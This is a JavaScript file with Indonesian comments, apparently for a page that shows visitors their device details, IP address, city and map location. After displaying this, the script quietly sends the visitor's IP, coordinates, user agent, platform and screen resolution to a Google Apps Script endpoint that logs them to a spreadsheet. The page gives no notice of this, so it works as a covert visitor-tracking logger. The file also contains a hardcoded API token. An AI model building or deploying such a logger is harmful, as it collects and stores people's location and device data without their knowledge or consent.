// Ambil info dari browser
const userAgent = navigator.userAgent;
let platform = "Unknown";

if (navigator.userAgentData && navigator.userAgentData.platform) {
  platform = navigator.userAgentData.platform;
} else {
  platform = navigator.platform || "Unknown";
}

// Tampilkan info perangkat
const deviceInfo = document.getElementById("deviceInfo");
deviceInfo.innerHTML = `
  <strong>User Agent:</strong> ${userAgent}<br>
  <strong>Platform:</strong> ${platform}<br>
  <strong>Resolusi Layar:</strong> ${window.screen.width} x ${window.screen.height}
`;

// Ambil data IP dan lokasi dari ipinfo
fetch("https://ipinfo.io/json?token=8f8f1f3820adfb")
  .then((res) => res.json())
  .then((data) => {
    document.getElementById("ipInfo").innerHTML = `
      <strong>IP Address:</strong> ${data.ip}<br>
      <strong>Kota:</strong> ${data.city}<br>
      <strong>Negara:</strong> ${data.country}<br>
      <strong>Lokasi (koordinat):</strong> ${data.loc}
    `;

    const [lat, lon] = data.loc.split(",");
    const mapUrl = `https://maps.google.com/maps?q=${lat},${lon}&z=15&output=embed`;
    document.getElementById("mapFrame").src = mapUrl;

    // Kirim data ke Google Sheets via Apps Script
    fetch("https://script.google.com/macros/s/AKfycbxE-jKDj3LfqMNDAxout8CTCwTazIpdpWnYwRWdcc4iqSviEglxdA5F7YgDhkKTopWq/exec", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        ip: data.ip,
        city: data.city,
        country: data.country,
        loc: data.loc,
        user_agent: userAgent,
        platform: platform,
        resolution: `${window.screen.width} x ${window.screen.height}`,
      }),
    });
  })
  .catch(() => {
    document.getElementById("ipInfo").innerHTML = "Gagal mengambil info IP.";
  });